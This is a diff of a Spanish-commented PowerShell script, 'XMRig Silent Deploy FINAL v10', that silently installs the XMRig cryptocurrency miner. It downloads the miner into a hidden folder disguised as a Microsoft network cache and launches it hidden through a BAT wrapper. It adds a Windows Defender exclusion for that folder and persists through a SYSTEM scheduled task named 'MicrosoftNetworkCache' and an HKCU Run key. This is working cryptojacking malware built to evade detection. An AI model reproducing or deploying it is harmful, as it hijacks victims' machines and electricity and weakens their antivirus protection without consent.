@@ -1,18 +1,18 @@
-# XMRig Silent Deploy FINAL - 100% funcional (v9)
+# XMRig Silent Deploy FINAL v10 - Defender exclusion + BAT wrapper (100% estable)
 $InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
 if (-not (Test-Path $InstallDir)) {
     New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
     (Get-Item $InstallDir).Attributes += "Hidden"
 }
 
+# Descarga y extracción
 $ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
 $ZipPath = "$env:TEMP\xmrig-final.zip"
-
 Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
-
 Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
 Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
 
+# Mover archivos si están en subcarpeta
 $Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
 if ($Sub) {
     Move-Item "$($Sub.FullName)\*" $InstallDir -Force
@@ -21,7 +21,9 @@ if ($Sub) {
 
 $ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
 $ConfigPath = "$InstallDir\config.json"
+$BatPath = "$InstallDir\start.bat"
 
+# Config (60% hilos + tu wallet)
 $ConfigJson = @"
 {
   "autosave": false,
@@ -42,18 +44,27 @@ $ConfigJson = @"
 "@
 $ConfigJson | Out-File $ConfigPath -Encoding UTF8 -Force
 
-Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden
+# BAT wrapper (más estable que lanzar exe directo desde tarea)
+"@echo off
+cd /d `"$InstallDir`"
+start /B xmrig.exe -c config.json -B --no-color" | Out-File $BatPath -Encoding ASCII -Force
 
+# Excluir carpeta del Defender (clave en labs)
+try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}
+
+# Arrancar inmediatamente
+Start-Process -FilePath $BatPath -WindowStyle Hidden
+
+# Persistencia SYSTEM (AtStartup)
 $TaskName = "MicrosoftNetworkCache"
-$Action  = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
+$Action  = New-ScheduledTaskAction -Execute $BatPath
 $Trigger = New-ScheduledTaskTrigger -AtStartup
-
 try {
     $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
 } catch {
-    $Trigger = New-ScheduledTaskTrigger -AtLogOn
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Force | Out-Null
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
 }
 
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "`"$ExePath`" -c `"$ConfigPath`" -B --no-color" -Force
+# Fallback Registry
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "`"$BatPath`"" -Force
